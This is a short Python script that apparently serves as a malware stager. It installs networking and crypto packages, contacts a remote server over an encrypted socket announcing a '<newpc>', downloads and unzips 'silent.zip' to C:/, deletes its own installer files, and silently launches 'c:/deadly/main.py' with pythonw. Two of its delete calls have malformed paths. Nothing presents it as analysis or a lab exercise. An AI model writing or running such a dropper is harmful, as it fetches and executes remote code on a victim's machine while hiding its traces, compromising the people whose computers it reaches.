import os
import zipfile
import subprocess


def main():
    packages = ['scapy==2.5', 'rsa', 'PyCryptodome', 'tqdm']
    for package in packages:
        subprocess.check_call(['pip', 'install', package])
    print("All packages installed")
    import FileTransfer
    client_socket, encryption_key = FileTransfer.initiate()
    client_socket.send(FileTransfer.encrypt('<newpc>'.encode(), encryption_key))
    data = FileTransfer.decrypt(client_socket.recv(1024), encryption_key).decode()
    print(data)
    FileTransfer.receive(client_socket, encryption_key, data, 'c:/')
    client_socket.close()
    with zipfile.ZipFile('c:/silent.zip', 'r') as zip:
        zip.extractall('c:/')
    if os.path.isfile('c:/silent.zip'):
        os.remove('c:/silent.zip')
    if os.path.isfile('c:/initiator.py'):
        os.remove(r'c/initiator.py')
    if os.path.isfile('c:/FileTransfer.py'):
        os.remove(r'c/FileTransfer.py')
    os.chdir('c:/deadly/')
    os.popen('start pythonw c:/deadly/main.py')


if __name__ == '__main__':
    main()
